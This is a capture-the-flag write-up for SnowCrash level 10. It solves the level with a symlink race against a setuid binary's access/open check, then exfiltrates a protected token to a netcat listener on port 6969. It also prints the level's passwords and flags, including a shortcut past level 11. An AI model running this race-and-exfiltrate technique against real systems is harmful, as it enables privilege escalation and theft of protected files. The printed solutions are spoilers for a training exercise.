# Level 10

## Vulnerability

Privilege escalation - symlink attack

Binary ```level10``` calls access then open

## Context

We find a binary and a token.
```
level10@SnowCrash:~$ ls -l
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```
When we run the binary it tells us it tells us it sends given file to host.
```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

## Solution

Can we find a host port hint in the binary?
```
level10@SnowCrash:~$ strings level10
...
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
...
```
In a second terminal lets use Netcat to listen on this port.
```
level10@SnowCrash:~$ nc 6969 -l
```
Back in the first terminal, if we create a file and send it to ourselves, it arrives in the second terminal.
```
level10@SnowCrash:~$ echo "oh hi" > /tmp/hi
level10@SnowCrash:~$ ./level10 /tmp/hi {VM_IP}
Connecting to {VM_IP}:6969 .. Connected!
Sending file .. wrote file!
```
To access the token, we find a potential weakness in the binary's use of ```access```.
```
level10@SnowCrash:~$ nm -u level10
...
         U access@@GLIBC_2.0
...
```
```man 2 access``` briefly describes [the vulnerability](https://stackoverflow.com/questions/7925177/access-security-hole)

> Warning:  Using  access()  to  check if a user is authorized to, for example, open a file
       before actually doing so using open(2) creates a security hole, because  the  user  might
       exploit  the  short time interval between checking and opening the file to manipulate it.

So lets create an infinite loop which switches a symbolic link between the binary and the token.
```
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/symlink; ln -fs ~/token /tmp/symlink; done
```
Then run the binary on the symbolic link.
```
level10@SnowCrash:~$ while true; do ./level10 /tmp/symlink {VM_IP}; done
```
Then when we listen, sometimes its garbage, but sometimes we read the token!
```
level10@SnowCrash:~$ nc 6969 -l
woupa2yuojeeaaed06riuj63c
```
Great!
```
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
Bonus: for some reason this token is also the password for user flag11, bypassing level11.
```
level10@SnowCrash:~$ su flag11
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag11@SnowCrash:~$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
